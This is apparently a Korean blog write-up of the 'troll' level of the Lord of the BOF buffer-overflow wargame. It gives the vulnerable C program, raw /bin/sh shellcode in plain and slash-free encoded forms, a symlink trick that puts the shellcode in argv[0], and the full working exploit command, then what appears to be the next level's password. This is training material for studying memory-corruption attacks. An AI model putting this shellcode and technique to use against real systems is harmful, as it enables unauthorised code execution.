@@ -1,0 +1,140 @@
+---
+layout: post
+title:  "[LOB]Level08. troll"
+subtitle:   "[LOB]orge → troll"
+categories: Wargame[LOB]
+tags:
+- Wargame
+- LOB
+- Write-up
+---
+
+## keyword : check argc
+
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - troll
+        - check argc + argv hunter
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+	char buffer[40];
+	int i;
+
+	// here is changed
+	if(argc != 2){
+		printf("argc must be two!\n");
+		exit(0);
+	}
+
+	// egghunter
+	for(i=0; environ[i]; i++)
+		memset(environ[i], 0, strlen(environ[i]));
+
+	if(argv[1][47] != '\xbf')
+	{
+		printf("stack is still your friend.\n");
+		exit(0);
+	}
+
+	// check the length of argument
+	if(strlen(argv[1]) > 48){
+		printf("argument is too long!\n");
+		exit(0);
+	}
+
+	strcpy(buffer, argv[1]);
+	printf("%s\n", buffer);
+
+    // buffer hunter
+    memset(buffer, 0, 40);
+
+	// one more!
+	memset(argv[1], 0, strlen(argv[1]));
+}
+```
+
+shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+
+
+'\x2f'없는 shell(48byte) = \xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
+
+ argc의 개수를 2로 정해졌으므로, argv[2]를 사용 하지 못한다.
+
+buffer내용도 0으로 초기화 되며, argv[1]를 이용해서 argv[2]를 덮으려고 해도 길이가 48을 넘어 갈 수 없다.
+
+그리고 argv[1]에 넣은 만큼 0으로 초기화 된다.
+
+
+
+트롤 맞네... 😩😫
+
+
+
+초기화 안된 영역은 argv[0]영역 밖에 없다. 이를 이용하자.
+
+`python -c 'print "A"*44+"\xbf"*4'`
+
+으로 core를 생성 한 후, core덤프에서 x/32s $esp 로 보다보면 파일 이름이 들어간 주소가 보인다.
+
+```sh
+0xbffffc44:	 ""
+0xbffffc45:	 ""
+0xbffffc46:	 ""
+0xbffffc47:	 "i686"
+0xbffffc4c:	 "./trola"
+0xbffffc54:	 ""
+0xbffffc55:	 ""
+0xbffffc56:	 ""
+```
+
+
+
+이제 argv[0]에 쉘코드를 넣어야 한다.
+
+> 이때 중요한것은 쉘코드에 '\x2f'값이 없어야 한다. 이유는 '/'문자열이 '\x2f'이기 때문에, 경로로 인식하게 때문이다.
+
+
+
+이때 심볼릭링크를 사용해야 한다.
+
+```sh
+[orge@localhost orge]$ ln -s troll `python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
+[orge@localhost orge]$ ls
+core
+trola
+troll
+troll.c
+??????????????????????????????????????????????????�?^1ɱ2?l?�??�?u��?�����2�Qi00tii0cjo?�QT?�?�?�?
+```
+
+```sh
+0xbffffa87:	 ""
+0xbffffa88:	 ""
+0xbffffa89:	 ""
+0xbffffa8a:	 ""
+0xbffffa8b:	 "i686"
+0xbffffa90:	 "./", '\220' <repeats 105 times>, "�\021^1ɱ2\200l\016�\001\200�\001u��\005�����2�Qi00tii0cjo\212�QT\212�\232�\f�\201"
+0xbffffb2c:	 ""
+0xbffffb2d:	 ""
+0xbffffb2e:	 ""
+0xbffffb2f:	 ""
+```
+
+./`python -c 'print "\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "A"*44+"\x90\xfa\xff\xbf"'`
+
+
+
+쉘코드를 파일 이름으로 심볼릭 링크 했기 때문에, 쉘코드를 파일로 인식을 하게 되고, main함수의 ret가 argv[0]을 가리키고 있는데 해당 주소에는 쉘코드가 있기 때문에 쉘이 실행된다.
+
+
+
+##### **troll / aspirin**
